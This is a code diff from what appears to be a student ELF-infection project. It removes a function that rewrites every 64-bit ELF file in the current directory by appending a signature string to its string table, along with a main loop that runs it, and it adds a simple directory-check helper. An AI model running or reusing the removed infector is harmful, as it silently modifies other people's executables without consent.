@@ -12,49 +12,18 @@
 
 #include "infection.h"
 
-void	infect_elf(char *file_path)
+int		is_directory(const char *filename)
 {
-	t_elf *elf;
+	struct stat	st;
+	DIR* directory;
 
-	elf = read_elf(file_path);
-	if (elf == NULL)
-		return ;
-	t_section *section = elf->get_section(elf, ".strtab");
-
-	if (section != NULL || (section = elf->get_section(elf, ".shstrtab")) != NULL) {
-		char *content = malloc(section->data->sh_size + 16);
-		memcpy(content, section->content, section->data->sh_size);
-		memcpy(content + section->data->sh_size, "jguyet-frmarinh", 15);
-		section->data->sh_size += 16;
-		free(section->content);
-		section->content = content;
-	}
-	char *data = write_elf(elf);
-
-	int fd = open(file_path, O_RDWR | O_CREAT | O_TRUNC, S_IRWXU);
-
-	if (fd > 0)
+	if (stat(filename, &st) == -1)
+		return (0);
+	directory = opendir(filename);
+	if (directory != NULL)
 	{
-		write(fd, data, elf->len);
-	}
-	destruct_elf(elf);
-}
-
-int		main(int argc, char **argv)
-{
-	(void)argc;
-	char **files = get_elf_files(NULL, ".", ELF_64);
-	int i = 0;
-
-	while (i < (int)array_length(files))
-	{
-		if (strcmp(argv[0], files[i]) == 0)
-		{
-			i++;
-			continue ;
-		}
-		infect_elf(files[i]);
-		i++;
+		closedir(directory);
+		return (1);
 	}
 	return (0);
 }
